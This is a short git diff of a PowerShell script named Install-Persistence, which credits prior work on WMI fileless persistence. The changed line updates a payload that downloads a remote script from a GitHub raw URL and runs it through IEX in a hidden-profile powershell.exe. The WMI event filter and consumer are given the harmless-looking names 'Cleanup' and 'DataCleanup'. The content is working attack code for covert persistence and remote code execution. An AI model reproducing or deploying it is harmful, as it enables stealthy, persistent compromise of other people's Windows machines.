@@ -4,7 +4,7 @@ Credits to @mattifestion for his awesome work on WMI and Powershell Fileless Per
 
 function Install-Persistence{
 
-    $Payload = "((new-object net.webclient).downloadstring('http://raw.githubusercontent.com/Potato-9257/WMI_Fileless_Persistence/refs/heads/main/Payload_Test'))"
+    $Payload = "((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Potato-9257/WMI_Fileless_Persistence/refs/heads/main/Payload_Test.ps1'))"
     $EventFilterName = 'Cleanup'
     $EventConsumerName = 'DataCleanup'
     $finalPayload = "powershell.exe -nop -c `"IEX $Payload`""
